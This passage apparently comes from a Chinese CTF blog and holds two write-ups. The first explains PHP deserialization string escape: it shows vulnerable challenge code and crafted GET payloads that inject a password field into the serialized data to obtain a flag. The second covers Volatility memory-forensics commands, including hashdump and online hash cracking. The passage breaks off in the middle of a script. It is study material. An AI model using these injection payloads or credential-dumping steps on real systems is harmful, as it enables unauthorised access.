src="https://img-blog.csdnimg.cn/20201114181927959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>替换后，字符增多，无法完成反序列化。需要做一下改动的地方是<code>username</code>处，因为反序列化遇到<code>;&#125;</code>与前面的<code>&#123;</code>闭合，就会停止反序列化。后面的内容自然忽略。尝试更改<code>username</code><br><img src="https://img-blog.csdnimg.cn/20201114184814218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>这里<code>username</code>直接传入<code>&quot;;s:8:&quot;password&quot;;s:3:&quot;lin&quot;;&#125;</code>在反序列化时，会在第一个<code>;&#125;</code>的位置结束反序列化。<br>但是替换过后，比如<code>o</code>变成<code>oo</code>，可是因为是当作username传入的，所以结果会是这样的</p><pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"m00re"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"lin"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这里还是4，实际上应该为5，所以反序列化就会失败。<br>但是这个值，是可以手动改的，只要算好替换后的位数，就可以使得反序列化成功。</p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><pre class="language-php" data-language="php"><code class="language-php">#m3w师傅的题目<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$uname</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$uname</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">uname</span><span class="token operator">=</span><span class="token variable">$uname</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$password</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token single-quoted-string string">'yu22x'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'wrong password'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Firebasky'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'Firebaskyup'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$ser</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token variable">$uname</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>这里要求<code>password=yu22x</code>，但是password的值已经设置好了，这里就是用反序列化字符逃逸使得原本的密码不被反序列化。<br>先进行序列化，在本地测试，可以将密码先改为<code>yu22x</code>，然后进行序列化，</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token single-quoted-string string">'yu22x'</span><span class="token punctuation">;</span><span class="token variable">$ser</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token variable">$uname</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$test=unserialize($ser);</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>得到结果</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"a"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"uname"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"?"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"yu22x"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>需要吞掉的部分是<code>&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</code>这是30个字符，每替换一次增加2个字符，所以需要15个<code>Firebasky</code>才可以，所以构造payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token number">1</span><span class="token operator">=</span>FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky<span class="token double-quoted-string string">";s:8:"</span>password<span class="token double-quoted-string string">";s:5:"</span>yu22x"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>这是需要当作username传入的参数，其实整个是<br><code>O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:1:&quot;?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; </code><br>到第一个<code>;&#125;</code>就会停止反序列化，更改的参数也是正确的，所以后面的password=1的部分就会被吞掉(忽略)。<br>反序列化成功就会得到flag。<br><img src="https://img-blog.csdnimg.cn/20201114201102200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><p>上面那个是刚好够30被吞掉，每替换一次吞掉两个字符。<br>所以算起来比较方便。<br>这个是不一样的。</p><pre class="language-php" data-language="php"><code class="language-php">#unctf<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$uname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$uname</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">uname</span><span class="token operator">=</span><span class="token variable">$uname</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token single-quoted-string string">'easy'</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'wrong password'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'challenge'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'easychallenge'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$ser</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token variable">$uname</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>还是在本地替换，替换正确密码。序列化结果。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"a"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"uname"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"?"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"easy"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>这个是替换一次，增加四个。而需要吞掉<code>&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>29个字符<br>无法正好替换，前面使用7个，则少一个，使用8个，则会多7个字符。<br>所以这里可以使用8个，后面使用一下占位符让其吞掉，比如<code>;</code>我理解的是因为遇到<code>;&#125;</code>才会结束反序列化，所以在;前面加7个<code>;</code>使得反序列化成功。<br>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token number">1</span><span class="token operator">=</span>challengechallengechallengechallengechallengechallengechallengechallengechallenge<span class="token double-quoted-string string">";s:8:"</span>password<span class="token double-quoted-string string">";s:4:"</span>easy"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span></code></pre><p>或者</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token number">1</span><span class="token operator">=</span>challengechallengechallengechallengechallengechallengechallengechallengechallenge<span class="token double-quoted-string string">";s:8:"</span>password<span class="token double-quoted-string string">";s:4:"</span>easy"<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>两个payload都一样的，可以序列化成功，得到flag</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关键字符减少的，等遇到题目再写。<br>以上题目均可百度找到。<br>参考文章<br>1、<a href="http://bealright.top:8888/2020/08/24/%E6%B5%85%E6%9E%90php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/">http://bealright.top:8888/2020/08/24/%E6%B5%85%E6%9E%90php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</a></p><p>2、<a href="https://mp.weixin.qq.com/s/7jAS7R_GuBBz6M8U6lQv-w">https://mp.weixin.qq.com/s/7jAS7R_GuBBz6M8U6lQv-w</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记——取证小集合</title>
      <link href="/posts/84374804/"/>
      <url>/posts/84374804/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近接触到的取证类题目很多，所以就总结一下这类题。<br>不得不提的是Volatility这个神器，本次学习，结合几个题目总结一下命令使用。还有一些大师傅的博客学来的知识。</p><h2 id="“食用”方法"><a href="#“食用”方法" class="headerlink" title="“食用”方法"></a>“食用”方法</h2><p>判断镜像信息，获取操作系统类型</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f ?.img/raw/<span class="token punctuation">..</span>. imageinfo</code></pre><p>知道操作系统类型后，用–profile指定</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f ?.img --profile<span class="token operator">=</span><span class="token punctuation">..</span>.</code></pre><p>查看当前显示的notepad文本</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility  -f file.raw --profile<span class="token operator">=</span>WinXPSP2x86 notepad</code></pre><p>查看当前运行的进程</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility  -f file.raw --profile<span class="token operator">=</span>WinXPSP2x86 psscan/pslist</code></pre><p>扫描所有的文件列表(常常结合grep)</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility  -f file.raw --profile<span class="token operator">=</span>WinXPSP2x86 filescan</code></pre><p>根据offset提取出文件</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility  -f file.raw --profile<span class="token operator">=</span>WinXPSP2x86 dumpfiles -D <span class="token builtin class-name">.</span> -Q 0x<span class="token punctuation">..</span><span class="token punctuation">..</span>.</code></pre><p>扫描 Windows 的服务</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f file.raw --profile<span class="token operator">=</span>WinXPSP2x86 svcscan</code></pre><p>查看网络连接</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f file.raw --profile<span class="token operator">=</span>WinXPSP2x86 connscan</code></pre><p>查看命令行上的操作</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f file.raw --profile<span class="token operator">=</span>WinXPSP2x86 cmdscan</code></pre><p>根据pid dump出相应的进程</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f easy_dump.img --profile<span class="token operator">=</span>Win7SP1x64 memdump -p <span class="token number">2580</span> -D 目录</code></pre><p>常用命令<br><img src="https://img-blog.csdnimg.cn/2020110623303995.png" alt="m0re" loading="lazy"></p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="湖湘杯-取证"><a href="#湖湘杯-取证" class="headerlink" title="湖湘杯(取证)"></a>湖湘杯(取证)</h3><p>一个G的raw文件，工具分析就行了。<br>使用</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#使用imageinfo参数查看内存是什么系统的镜像</span>volatility -f men.raw imageinfo<span class="token comment">#profile=Win7SP1x86_23418</span><span class="token comment">#直接查看用户名和密码hash</span>volatility -f men.raw --profile<span class="token operator">=</span>Win7SP1x86_23418 hashdump</code></pre><p>然后看到三个用户<br><img src="https://img-blog.csdnimg.cn/20201106232255221.png#pic_center" alt="m0re" loading="lazy"><br>使用彩虹表暴力猜解<br><a href="https://crackstation.net/">hash猜解</a><br><img src="https://img-blog.csdnimg.cn/20201106232513857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>密码是qwer1234<br>题目是说的sha1(password)<br>所以再进行加密一下就可以了<br><img src="https://img-blog.csdnimg.cn/20201106232537610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="BUU内存取证-VN"><a href="#BUU内存取证-VN" class="headerlink" title="BUU内存取证(VN)"></a>BUU内存取证(VN)</h3><p>首先查看镜像信息<br><img src="https://img-blog.csdnimg.cn/202011070810210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>列出进程，一般使用<code>pslist</code>当然还有其他的，<code>pstree</code>和<code>psscan</code><br><img src="https://img-blog.csdnimg.cn/20201107084131265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>记几个重要的地方，一般是<code>notepad.exe、TrueCrypt.exe 、mspaint.exe、iexplore.exe 、DumpIt.exe</code><br>简单介绍：<br><code>mspaint.exe</code>是一个画图软件<br><code>notepad.exe</code>是记事本，一般记事本中会有内容hint或者在内存中(还未保存)<br><code>DumpIt </code>是一款绿色免安装的 windows 内存镜像取证工具。利用它我们可以轻松地将一个系统的完整内存镜像下来，并用于后续的调查取证工作。<br><code>TrueCrypt.exe </code><img src="https://img-blog.csdnimg.cn/20201107090059783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>先将这些可疑进程dump下来。进行进一步的分析</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP0x86 memdump -p <span class="token number">2648</span> --dump-dir<span class="token operator">=</span>./</code></pre><p>类似这样的，先分析画图的，需要使用一个工具<code>gimp</code>在linux中相当于photoshop一样的软件，直接安装就可以</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#在root权限下</span><span class="token function">apt-get</span> update<span class="token function">apt-get</span> <span class="token function">install</span> gimp</code></pre><p>然后打开使用就可以了<br><a href="https://segmentfault.com/a/1190000018813033?utm_source=tag-newest">https://segmentfault.com/a/1190000018813033?utm_source=tag-newest</a><br>这个师傅讲的如何使用这个软件。<br><img src="https://img-blog.csdnimg.cn/20201107124101975.png" alt="m0re" loading="lazy"><br>刚打开时，是默认分辨率是0，高度和宽度都是350，先随便调节一下，大概就是三个变量值都先调低一点，然后慢慢调高。<br>调试很多次，慢慢调节出一些值，这个值可以参考windows系统自带画图软件的，我的是1628x440，修改一下，就开始改变分辨率就可以了。下图大概成型了<br><img src="https://img-blog.csdnimg.cn/20201107125234489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后微调一下宽度就行,不过调过之后是反的，所以可以再调大一些，多调动尝试最佳角度。<br><img src="https://img-blog.csdnimg.cn/20201107152230395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>拿到了一个字符串<code>1YxfCQ6goYBD6Q</code><br>然后看下一步，提取记事本中的内容<br>这里介绍一个插件<code>editbox</code>可以显示有关编辑控件的信息。<br>使用命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">volatility -f men.raw --profile<span class="token operator">=</span>Win7SP1x86_23418 editbox</code></pre><p><img src="https://img-blog.csdnimg.cn/20201107154135511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>网盘链接得到了，提取码也得到了，就进行下一步<br>下载得到一个VOL文件<br><img src="https://img-blog.csdnimg.cn/20201107160009700.png#pic_center" alt="m0re" loading="lazy"><br>然后就是TrueCrypt，这个dump下来不用进行其他操作，成功挂载到F盘，里面看到key 文件<br><img src="https://img-blog.csdnimg.cn/20201107155535461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>打开获得<code>uOjFdKu1jsbWI8N51jsbWI8N5</code><br>这个就是VOL挂载加密的key，然后使用TrueCrypt对VOL进行正常解密，<br>下载安装TrueCrypt，我安装到物理机上面了，直接使用。<br>密钥填写一下，选择TrueCrypto模式<br><img src="https://img-blog.csdnimg.cn/20201107161634433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>成功挂载<br><img src="https://img-blog.csdnimg.cn/20201107160854226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>挂载后，可以在Z盘直接看到一个压缩包<br><img src="https://img-blog.csdnimg.cn/20201107161158102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>打开需要密码，这个时候用到了画图时得到的密码。<br><img src="https://img-blog.csdnimg.cn/20201107161252705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h3 id="easydump"><a href="#easydump" class="headerlink" title="easydump"></a>easydump</h3><p>来源：护网杯2018-MISC-easydump<br><code>.img</code>文件，也是一种内存镜像<br>使用取证神器直接跑<br><img src="https://img-blog.csdnimg.cn/20201107162738833.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后就是列出进程<br>pslist<br>最显眼的还是这个notepad.exe了<br><img src="https://img-blog.csdnimg.cn/20201107162957308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后dump下来2580.dmp,binwalk查看，信息太多，直接foremost分离文件，里面发现有用的就是两个压缩包，解压是img文件。但是这个文件同样使用volatility去跑，确没有信息，所以判断这个不是内存镜像文件。<br><img src="https://img-blog.csdnimg.cn/20201107163738714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>先strings看一下<br><img src="https://img-blog.csdnimg.cn/20201107163955312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>发现好多信息，然后将img文件挂载在linux系统中，</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> -o loop message.img /root/Desktop/m0re</code></pre><p>挂载后，可以切换到该目录进行查看信息</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> m0re/<span class="token function">ls</span> -all<span class="token comment">#查看所有文件，一般隐藏信息较多</span></code></pre><p>然后在<code>.Trash-0/file</code>下看到一个<code>.message.swp</code><br>转存一下</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> .message.swp <span class="token operator">></span> m0re.txtstrings m0re.txt</code></pre><p><img src="https://img-blog.csdnimg.cn/20201107165735346.png#pic_center" alt="m0re" loading="lazy"><br>可能是密码什么的，保存一下<br>hint.txt文件里面都是坐标，猜测是要画图<br>之前保存过画图的python脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'hint.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>points <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>pic<span class="token operator">=</span>Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token 